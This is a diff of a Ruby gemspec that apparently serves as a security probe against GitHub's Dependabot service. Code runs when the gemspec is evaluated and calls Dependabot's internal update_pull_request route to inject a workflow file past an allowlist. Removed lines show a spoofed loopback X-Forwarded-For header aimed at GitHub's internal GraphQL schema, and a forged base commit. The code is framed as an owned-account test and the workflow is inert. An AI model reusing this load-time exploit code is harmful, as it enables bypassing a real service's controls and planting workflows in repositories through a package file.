@@ -4,14 +4,30 @@ require "json"
 require "net/http"
 require "uri"
 
-# Owned-account security test. This submits one benign Dependabot PR whose
-# caller-selected parent is an unattached commit in the same owned repository.
-# That parent was built through nested Git tree objects and contains only the
-# three controlled workflow-run proof files.
-module OwnedDependabotNestedWorkflowScopeProbe
+# Owned-account security test for the Dependabot update_pull_request route.
+# The workflow is inert and can only be dispatched manually after it reaches a
+# default branch. The test stops after replacing one already-open owned PR.
+module OwnedDependabotUpdateRouteProbe
   CONSUMER = "7s5/codeload-owned-probe-20261030-91f64a2c"
-  FORGED_BASE_SHA = "0956642c7847fd597b6b619629b58a20a84e3c5a"
-  RAW_PATH = "vendor/owned-dependabot-internal-schema-xff-control.txt"
+  WORKFLOW_PATH = ".github/workflows/owned-dependabot-update-route-proof.yml"
+  DEPENDENCY_NAMES = %w[
+    owned_dependabot_nested_workflow_scope_probe
+    owned_dependabot_jit_probe
+    owned_dependabot_non_target_base_probe
+  ].freeze
+
+  WORKFLOW = <<~YAML.freeze
+    name: Owned Dependabot update-route proof
+    "on":
+      workflow_dispatch:
+    permissions:
+      contents: read
+    jobs:
+      inert-proof:
+        runs-on: ubuntu-latest
+        steps:
+          - run: echo "Owned inert workflow-file proof; no secret or write access requested."
+  YAML
 
   module_function
 
@@ -20,80 +36,55 @@ module OwnedDependabotNestedWorkflowScopeProbe
     api_base = ENV["DEPENDABOT_API_URL"]
     return if job_id.to_s.empty? || api_base.to_s.empty?
 
-    marker = "/tmp/owned-dependabot-nested-workflow-scope-#{job_id}"
+    marker = "/tmp/owned-dependabot-update-route-#{job_id}"
     File.open(marker, File::WRONLY | File::CREAT | File::EXCL, 0o600) {}
 
-    endpoint = URI("#{api_base.sub(%r{/*$}, "")}/update_jobs/#{job_id}/create_pull_request")
-    request = Net::HTTP::Post.new(endpoint.request_uri)
-    request["Content-Type"] = "application/json"
-    probe = internal_schema_probe
-    request.body = JSON.generate(payload(probe))
-    proxy_client(endpoint).request(request)
+    base_sha = current_consumer_tip
+    return if base_sha.to_s.empty?
+
+    endpoint = URI("#{api_base.sub(%r{/*$}, "")}/update_jobs/#{job_id}/update_pull_request")
+    DEPENDENCY_NAMES.each do |dependency_name|
+      response = post(endpoint, payload(dependency_name, base_sha))
+      break if response.code.to_i.between?(200, 299)
+    end
   rescue Errno::EEXIST
     nil
   rescue StandardError
     nil
   end
 
+  def current_consumer_tip
+    endpoint = URI("https://api.github.com/repos/#{CONSUMER}/commits/main")
+    request = Net::HTTP::Get.new(endpoint.request_uri)
+    request["Accept"] = "application/vnd.github+json"
+    response = proxy_client(endpoint).request(request)
+    return unless response.code.to_i == 200
+
+    JSON.parse(response.body)["sha"]
+  end
+
+  def post(endpoint, body)
+    request = Net::HTTP::Post.new(endpoint.request_uri)
+    request["Content-Type"] = "application/json"
+    request.body = JSON.generate(body)
+    proxy_client(endpoint).request(request)
+  end
+
   def proxy_client(endpoint)
     client = Net::HTTP::Proxy(:ENV).new(endpoint.host, endpoint.port)
     client.use_ssl = endpoint.scheme == "https"
     client.open_timeout = 10
-    client.read_timeout = 20
+    client.read_timeout = 30
     client
   end
 
-  def internal_schema_probe
-    endpoint = URI("https://api.github.com/graphql")
-    request = Net::HTTP::Get.new(endpoint.request_uri)
-    request["GraphQL-Schema"] = "internal"
-    request["X-Forwarded-For"] = "127.0.0.1"
-    response = proxy_client(endpoint).request(request)
-    parsed = JSON.parse(response.body)
-    types = parsed.dig("data", "__schema", "types") || []
-    check_suite_fields = types.find { |type| type["name"] == "CheckSuite" }&.fetch("fields", []) || []
-    mutation_fields = types.find { |type| type["name"] == "Mutation" }&.fetch("fields", []) || []
-    {
-      "http_status" => response.code.to_i,
-      "internal_artifacts_field_visible" => check_suite_fields.any? { |field| field["name"] == "artifacts" },
-      "internal_create_check_suite_visible" => mutation_fields.any? { |field| field["name"] == "createCheckSuite" },
-      "top_level_error_codes" => Array(parsed["errors"]).map { |error| error.dig("extensions", "code") || "unclassified" }.uniq.sort
-    }
-  rescue StandardError => error
-    {
-      "http_status" => 0,
-      "internal_artifacts_field_visible" => false,
-      "internal_create_check_suite_visible" => false,
-      "top_level_error_codes" => [error.class.name]
-    }
-  end
-
-  def payload(probe)
-    requirement = {
-      "file" => "Gemfile",
-      "requirement" => ">= 0",
-      "groups" => [],
-      "source" => {
-        "type" => "git",
-        "url" => "https://github.com/downgraded/codeload-owned-probe-20261030-91f64a2c",
-        "branch" => "main",
-        "ref" => nil
-      }
-    }
-
+  def payload(dependency_name, base_sha)
     {
       "data" => {
-        "dependencies" => [{
-          "name" => "owned_dependabot_nested_workflow_scope_probe",
-          "version" => "0.0.11",
-          "previous-version" => "0.0.10",
-          "requirements" => [requirement],
-          "previous-requirements" => [requirement],
-          "directory" => "/"
-        }],
+        "dependency-names" => [dependency_name],
         "updated-dependency-files" => [{
-          "name" => RAW_PATH,
-          "content" => "#{JSON.generate(probe)}\n",
+          "name" => WORKFLOW_PATH,
+          "content" => WORKFLOW,
           "directory" => "/",
           "type" => "file",
           "support_file" => false,
@@ -101,20 +92,20 @@ module OwnedDependabotNestedWorkflowScopeProbe
           "deleted" => false,
           "operation" => "create"
         }],
-        "base-commit-sha" => FORGED_BASE_SHA,
-        "commit-message" => "test: owned Dependabot internal-schema XFF control",
-        "pr-title" => "Owned Dependabot internal-schema XFF control",
-        "pr-body" => "Owned security test. GitHub's GET /graphql response contains schema metadata; the marker records only visibility booleans and an HTTP status from the real Dependabot outbound proxy with a loopback X-Forwarded-For control. Result: #{JSON.generate(probe)}"
+        "base-commit-sha" => base_sha,
+        "commit-message" => "test: owned Dependabot update-route allowlist proof",
+        "pr-title" => "Owned Dependabot update-route workflow allowlist proof",
+        "pr-body" => "Owned security test: a Bundler refresh job supplied this inert workflow path directly to update_pull_request. The create route rejects the same path for non-Actions ecosystems. No workflow was executed or merged."
       }
     }
   end
 end
 
-OwnedDependabotNestedWorkflowScopeProbe.run
+OwnedDependabotUpdateRouteProbe.run
 
 Gem::Specification.new do |spec|
   spec.name = "owned_dependabot_remote_probe"
-  spec.version = "0.0.11"
+  spec.version = "0.0.12"
   spec.summary = "Owned Dependabot security probe"
   spec.authors = ["Owned Security Test"]
   spec.files = []
